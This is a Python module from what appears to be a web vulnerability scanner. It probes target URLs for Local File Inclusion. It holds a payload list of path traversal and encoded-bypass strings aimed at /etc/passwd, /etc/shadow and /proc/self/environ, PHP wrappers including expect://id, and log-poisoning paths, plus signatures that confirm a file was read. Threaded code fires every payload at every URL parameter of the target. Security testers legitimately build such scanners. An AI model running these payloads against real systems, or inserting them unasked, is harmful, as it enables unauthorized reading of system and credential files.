"""
modules/lfi.py
--------------
Local File Inclusion (LFI) detection module.

Detects LFI by injecting path traversal payloads and checking
if sensitive file contents appear in the response.
"""

import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any

from modules.base import BaseModule
from utils.helpers import extract_params, inject_param


DEFAULT_LFI_PAYLOADS = [
    # Linux targets
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/version",
    # Null byte bypass (older PHP)
    "../../etc/passwd%00",
    "../../etc/passwd\x00",
    # Encoded traversal
    "..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Windows targets
    "..\\..\\windows\\win.ini",
    "..\\..\\.\\windows\\win.ini",
    "../../windows/win.ini",
    "C:\\windows\\win.ini",
    "C:/windows/win.ini",
    # PHP wrappers
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://input",
    "file:///etc/passwd",
    "expect://id",
    # Log poisoning paths
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
]

# File content signatures indicating successful LFI
LFI_SUCCESS_SIGNATURES = [
    "root:x:0:0:",         # /etc/passwd
    "root:*:",              # /etc/shadow
    "127.0.0.1",            # /etc/hosts
    "[fonts]",              # windows/win.ini
    "[extensions]",         # windows/win.ini
    "DOCUMENT_ROOT",        # PHP environ
    "Linux version",        # /proc/version
    "HTTP_USER_AGENT",      # PHP environ
]


class LFIModule(BaseModule):
    """
    Local File Inclusion detection module.

    Injects path traversal sequences into URL parameters and
    detects known file content signatures in the response.
    """

    def load_payloads(self) -> List[str]:
        """Load LFI payloads from wordlist or defaults."""
        if self.config.wordlist:
            return self._load_external_wordlist(self.config.wordlist)
        return DEFAULT_LFI_PAYLOADS

    def execute(self) -> List[Dict[str, Any]]:
        """Run LFI scan across detected URL parameters."""
        payloads = self.load_payloads()
        self.logger.info(f"[+] {len(payloads)} LFI payloads loaded")

        params = extract_params(self.config.url, self.config.param)
        if not params:
            self.logger.warning("[!] No injectable parameters found in URL")
            return []

        self.logger.info(f"[+] Parameters detected: {', '.join(params)}")

        jobs = [(payload, param) for param in params for payload in payloads]
        self.logger.info(f"[*] Testing {len(jobs)} payload/param combinations...")

        results = []
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = {
                executor.submit(self._test_payload, payload, param): (payload, param)
                for payload, param in jobs
            }
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    if result.get("vulnerable"):
                        self.logger.info(
                            f"  [VULN] Param='{result['param']}' "
                            f"Payload='{result['payload'][:50]}' "
                            f"| {result['evidence']}"
                        )

        return results

    def _test_payload(self, payload: str, param: str) -> Dict[str, Any]:
        """Inject LFI payload and analyze response. Delay applied per-worker."""
        if self.config.delay:
            time.sleep(self.config.delay)

        injected_url = inject_param(self.config.url, param, payload)
        response = self.http.get(injected_url)

        if response is None:
            return {
                "payload": payload,
                "param": param,
                "vulnerable": False,
                "evidence": "No response",
                "url": injected_url,
            }

        return self.analyze_response(response, payload, param)

    def analyze_response(self, response, payload: str, param: str, **kwargs) -> Dict[str, Any]:
        """
        Check response for known file content signatures.

        If any LFI success signature is found in the response body,
        the injection is flagged as a confirmed LFI.
        """
        result = {
            "payload": payload,
            "param": param,
            "vulnerable": False,
            "evidence": "",
            "status_code": response.status_code,
            "response_length": len(response.content),
            "url": response.url if hasattr(response, "url") else self.config.url,
        }

        body = response.text

        for signature in LFI_SUCCESS_SIGNATURES:
            if signature in body:
                result["vulnerable"] = True
                result["evidence"] = f"File content signature found: '{signature}'"
                return result

        return result
